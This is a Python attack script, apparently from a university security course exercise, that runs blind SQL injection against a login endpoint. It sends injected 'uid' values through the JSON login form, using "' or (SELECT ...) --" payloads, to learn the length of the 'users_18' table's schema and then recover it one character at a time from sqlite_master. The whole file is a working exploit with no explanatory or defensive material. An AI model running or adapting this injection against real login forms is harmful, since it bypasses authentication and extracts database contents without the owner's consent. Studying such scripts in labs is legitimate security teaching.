#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import string

URL = 'https://itkst53.it.jyu.fi/yope/login'
FOUND = ''
FOUND_COL = []
LENGTH = 0
OFFSET = 1

alphabet = list(string.printable)
for o in range(OFFSET):
    for i in range(100):
        payload = "' or (SELECT length(sql) FROM sqlite_master WHERE type!='meta' and sql NOT NULL and name not like 'sqlite_%' and name='users_18' limit 1 offset " + str(o) + ")=" + str(i) + " --"
        x = requests.post(URL, json={"uid": payload, "pass": ""})
        if 'Nope!' in x.text:
            continue
        if 'Welcome!' in x.text:
            LENGTH = i
            print("Pituus: " + str(i))
            break
        if 'Error!' in x.text:
            print('Virhe pituudessa!')
            break

    for i in range(1,LENGTH+1):
        for character in alphabet:
            payload = "' or (SELECT substr(sql," + str(i) + ",1) FROM sqlite_master WHERE type!='meta' and sql NOT NULL and name NOT like 'sqlite_%' and name='users_18' limit 1 offset " + str(o) + ") ='" + character + "' --"
            x = requests.post(URL, json={"uid": payload, "pass": ""})
            if 'Nope!' in x.text:
                continue
            if 'Welcome!' in x.text:
                FOUND = FOUND + character
                break
            if 'Error!' in x.text:
                print('Virhe kirjaimissa!')
                break
    FOUND_COL.append(FOUND)
    print("Löydettiin: " + FOUND)
    FOUND = ""        

print("Valmis, löydetyt:")
print(*FOUND_COL, sep = ', ')